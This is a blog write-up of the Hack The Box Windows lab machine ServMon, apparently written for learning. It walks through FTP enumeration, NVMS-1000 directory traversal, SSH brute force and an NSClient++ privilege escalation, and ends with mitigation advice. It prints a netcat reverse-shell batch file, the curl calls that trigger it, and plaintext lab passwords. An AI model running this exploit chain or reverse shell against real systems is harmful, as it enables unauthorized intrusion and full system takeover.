<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack The Box - ServMon" /><meta property="og:locale" content="en" /><meta name="description" content="This is my guide to the HackTheBox Windows machine ServMon." /><meta property="og:description" content="This is my guide to the HackTheBox Windows machine ServMon." /><link rel="canonical" href="https://tid4l.github.io/posts/HTB-ServMon/" /><meta property="og:url" content="https://tid4l.github.io/posts/HTB-ServMon/" /><meta property="og:site_name" content="TidalSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-04-24T13:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - ServMon" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-04-24T13:00:00-05:00","datePublished":"2020-04-24T13:00:00-05:00","description":"This is my guide to the HackTheBox Windows machine ServMon.","headline":"Hack The Box - ServMon","mainEntityOfPage":{"@type":"WebPage","@id":"https://tid4l.github.io/posts/HTB-ServMon/"},"url":"https://tid4l.github.io/posts/HTB-ServMon/"}</script><title>Hack The Box - ServMon | TidalSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="TidalSec"><meta name="application-name" content="TidalSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avi/avi.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">TidalSec</a></div><div class="site-subtitle font-italic">Cybersecurity.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tid4l" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack The Box - ServMon</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - ServMon</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Chris</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1587751200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-04-24 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1567 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p>This is my guide to the HackTheBox Windows machine <em>ServMon</em>.</p><hr /><blockquote class="prompt-warning"><div><p>These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.</p></div></blockquote><p><img data-src="/assets/img/posts/htb/04-2020/info.PNG" alt="" data-proofer-ignore> <em>Task: Find <a href="#user-flag">user.txt</a> and <a href="#root-flag">root.txt</a></em></p><h2 id="penetration-methodologies"><span class="mr-2">Penetration Methodologies</span><a href="#penetration-methodologies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Scanning</strong></p><ul><li>nmap</ul><p><strong>Enumeration</strong></p><ul><li>FTP anonymous login</ul><p><strong>Exploitation</strong></p><ul><li><p>NVMS-1000 directory traversal attack</p><li><p>Weak password policy</p></ul><p><strong>Priv Esc</strong></p><ul><li>NSClient++ privilege escalation exploit</ul><h2 id="user-flag"><span class="mr-2">User Flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>To start out, we’ll run an <code class="language-plaintext highlighter-rouge">nmap</code> scan. The results seem to indicate that <em>ServMon</em> is a Windows webserver.</p><ul><li><p><strong>sC</strong>: Enable common scripts</p><li><p><strong>sV</strong>: version and service on the port</p><li><p><strong>O</strong>: remote OS detection using fingerprinting</p></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Wed Jun 24 21:14:11 2020 as: nmap -sC -sV -O -oA scan184 10.10.10.184</span>
Nmap scan report <span class="k">for </span>10.10.10.184
Host is up <span class="o">(</span>0.081s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_01-18-20  12:05PM       &lt;DIR&gt;          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 <span class="o">(</span>RSA<span class="o">)</span>
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     &lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="o">&gt;</span>
|     &lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;title&gt;&lt;/title&gt;
|     &lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">"text/javascript"</span><span class="o">&gt;</span>
|     window.location.href <span class="o">=</span> <span class="s2">"Pages/login.htm"</span><span class="p">;</span>
|     &lt;/script&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>

<span class="o">[</span>...]

Network Distance: 2 hops
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m12s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2020-06-25T02:20:31
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Wed Jun 24 21:16:32 2020 -- 1 IP address (1 host up) scanned in 141.75 seconds</span>
</pre></table></code></div></div><p>Once we receive the results of the first scan, we’ll perform a full one as well. On this box, it yields nothing.</p><p>The first thing we see is that <code class="language-plaintext highlighter-rouge">nmap</code> indicates that anonymous login on FTP port 21 is enabled. This may yield some access to the file system. Let’s attempt the username anonymous with no password. We connect succesfully!</p><p><img data-src="/assets/img/posts/htb/04-2020/ftp-login.png" alt="" data-proofer-ignore></p><p>Only a few files are present but there is enough here to help enumerate the system a bit more. Within the <code class="language-plaintext highlighter-rouge">users</code> directory are two directories for users nadine and nathan. Additionally, each user has a file saved. With the <code class="language-plaintext highlighter-rouge">get</code> command, we retrieve a copy of each one.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>ftp&gt; <span class="nb">cd </span>Nadine
ftp&gt; get Confidential.txt
ftp&gt; <span class="nb">cd</span> ..
ftp&gt; <span class="nb">cd </span>Nathan
ftp&gt; get <span class="s2">"Notes to do.txt"</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">Confidential.txt</code> contains some interesting information:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
</pre></table></code></div></div><p>It looks like if we can gain access to Nathan’s desktop, we will find a file containing passwords. The <code class="language-plaintext highlighter-rouge">Notes to do.txt</code> also seems to indicate that user <code class="language-plaintext highlighter-rouge">nathan</code> has not removed the password file as requested. It may still be there.</p><p>Okay, so with that, we’ve exhausted what is available within the FTP file share, let’s return to our <code class="language-plaintext highlighter-rouge">nmap</code> scan results. Next, we’ll navigate to the webpage.</p><p>The box is hosting the service <code class="language-plaintext highlighter-rouge">NVMS-1000</code>, a management client for survellience devices. We don’t have much in the way of credentials, but we’ll just try a few basic combinations, to no avail.</p><p><img data-src="/assets/img/posts/htb/04-2020/nvms.png" alt="" data-proofer-ignore></p><p>A quick google search reveals that this service is vulnerable to a <a href="https://www.exploit-db.com/exploits/47774">directory traversal attack</a>. Perfect! We know from earlier that a password file may still reside on Nathan’s desktop.</p><p>For this attack, we’ll use <code class="language-plaintext highlighter-rouge">Burp Suite</code> to build my payload. First, we’ll configure burp as our proxy, turn on intercept, and capture the GET request for the NVMS login page, the main page on <em>ServMon</em>. Next, we’ll right-click and send that request to the repeater. We then change the path in the request to the directory traversal payload, and send it. Success! We now have arbitrary file access.</p><p>Let’s modify the payload with the specified path of the potential location of the password file: <code class="language-plaintext highlighter-rouge">/Users/Nathan/Desktop/passwords.txt</code></p><p>We receive a respond, with a list of passwords.</p><p><img data-src="/assets/img/posts/htb/04-2020/traversal.png" alt="" data-proofer-ignore></p><p>We noted earlier that port 22 was open as well. We have some usernames and some passwords, so let’s attempt connection through SSH first. Our lists are pretty short but for good practice, we’ll use <code class="language-plaintext highlighter-rouge">hydra</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>hydra <span class="nt">-l</span> users.txt <span class="nt">-P</span> passwords.txt 10.10.10.184 ssh
</pre></table></code></div></div><p>One combination connects successfully, and we gain remote access as user nadine.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh nadine@10.10.10.184
password: L1k3B1gBut7s@W0rk
</pre></table></code></div></div><p>Let’s grab the first flag from the user’s desktop.</p><p><img data-src="/assets/img/posts/htb/04-2020/user-flag.png" alt="" data-proofer-ignore></p><h2 id="root-flag"><span class="mr-2">Root Flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Some quick enumeration as user nadine reveals little. Back stepping a bit, the <code class="language-plaintext highlighter-rouge">nmap</code> scan indicated that port 8443 was also open and running the service NSClient. In the browser, we’ll navigate to <code class="language-plaintext highlighter-rouge">https://10.10.10.184:8443/</code>.</p><p><img data-src="/assets/img/posts/htb/04-2020/nsclient.png" alt="" data-proofer-ignore></p><p>NSClient requires just a password so we’ll quickly attempt the ones from my previous list, but no luck. Searching online we find that NSClient is vulnerable to a <a href="https://www.exploit-db.com/exploits/46802">privilege escalation exploit</a>.</p><p>The exploit states that the first step must be to find the webapp password with the <code class="language-plaintext highlighter-rouge">nsclient.ini</code> file. In our shell session, we can display the contents of the file and find the password.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="s2">"\Program Files\NSClient++\nsclient.ini"</span><span class="w">
</span></pre></table></code></div></div><p>Additionally, we’ll note that the only authorized host is <code class="language-plaintext highlighter-rouge">127.0.0.1</code> or localhost.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
</pre></table></code></div></div><p>To bypass this restriction, let’s make a tunnel using SSH and forward the port. <a href="https://linuxize.com/post/how-to-setup-ssh-tunneling/">Linuxize</a> provides a great write-up on this topic. Reconnecting with the following command should allow us to login in successfully.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-L</span> 8443:127.0.0.1:8443 nadine@10.10.10.184
</pre></table></code></div></div><p>Next, we’ll navigate to <code class="language-plaintext highlighter-rouge">https://127.0.0.1:8443/</code> and attempt to login. Success!</p><p><img data-src="/assets/img/posts/htb/04-2020/nsclient-main.png" alt="" data-proofer-ignore></p><p>Unfortunately, the web application was too buggy and difficult to use without frustration, so I dug into the <a href="https://docs.nsclient.org/api/rest/">documentation</a> for NSClient and decided to use <code class="language-plaintext highlighter-rouge">curl</code> commands to complete the exploit.</p><p>The next step of the exploit requires a simple batch file for a reverse shell. Let’s name it <code class="language-plaintext highlighter-rouge">evil.bat</code>.</p><div class="language-bat highlighter-rouge"><div class="code-header"> <span data-label-text="Bat"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>@echo <span class="na">off</span>
<span class="kd">c</span>:\temp\nc.exe <span class="m">10</span>.10.14.2 <span class="m">4444</span> <span class="na">-e </span><span class="nb">cmd.exe</span>
</pre></table></code></div></div><p>Next, we need to get my batch file and <code class="language-plaintext highlighter-rouge">nc.exe</code> onto <em>ServMon</em>. There a few different means to do that, but since we already have an SSH login, we’ll use SCP, or secure copy.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cp</span> /usr/share/windows-resources/binaries/nc.exe <span class="nb">.</span>
<span class="nv">$ </span>scp nc.exe nadine@10.10.10.184:/Temp
<span class="nv">$ </span>scp evil.bat  nadine@10.10.10.184:/Temp
</pre></table></code></div></div><p>On Kali, we’ll start an <code class="language-plaintext highlighter-rouge">netcat</code> listener.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
</pre></table></code></div></div><p>Using the documentation, we run the following command to <a href="https://docs.nsclient.org/api/rest/scripts/#add-script">add a script</a> that will call our batch file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-u</span> admin <span class="nt">-X</span> PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat <span class="nt">--data-binary</span> @evil.bat
</pre></table></code></div></div><p>And finally, we will <a href="https://docs.nsclient.org/api/rest/queries/#command-execute">execute the command</a> to run the script.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-u</span> admin https://localhost:8443/api/v1/queries/evil/commands/execute?time<span class="o">=</span>3m
</pre></table></code></div></div><p>Our listener successfully connects, and we now have system shell.</p><p><img data-src="/assets/img/posts/htb/04-2020/root.png" alt="" data-proofer-ignore></p><p>Let’s capture the final flag on the Administrator’s desktop.</p><p><img data-src="/assets/img/posts/htb/04-2020/root-flag.png" alt="" data-proofer-ignore></p><hr /><h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>Firstly, disable anonymous login on FTP. Very few services in an organization benefit from having guest or anonymous logins. In this instance, simply disabling this on FTP would severely limit severity of the directory traversal attack.</p><li><p>Software, especially public-facing, should be patched quickly, especially when a critical vulnerability like a directory traversal attack exists. If the patch does not become available or the vendor stops support, an organization should consider using different software.</p><li><p>Never store passwords in plaintext.</p><li><p>Previously mentioned methods of mitigation would’ve prevented an attacker from exploiting the privilege escalation vulnerability with NSClient++, as they would not have been able to forward ports nor have remote access to the file system. Regardless, layered security is key, and software patching still applies in this instance.</p></ul><h2 id="final-thoughts"><span class="mr-2">Final Thoughts</span><a href="#final-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I really enjoyed the process to root this box. Unfortunately, the issues during the privilege escalation caused a lot of frustration, but I appreciate how it drove me to read the documentation and find a more stable route, even getting me to use a tool that I have little experience with.</p><p>Additionally, I felt it was important to see the impact that directory traversal can have in conjunction with some file system enumeration.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - ServMon - TidalSec&amp;url=https://tid4l.github.io/posts/HTB-ServMon/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - ServMon - TidalSec&amp;u=https://tid4l.github.io/posts/HTB-ServMon/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://tid4l.github.io/posts/HTB-ServMon/&amp;text=Hack The Box - ServMon - TidalSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/First-Post-and-Obligatory-Blog-Walkthrough/">First Post and Obligatory Blog Walkthrough</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" 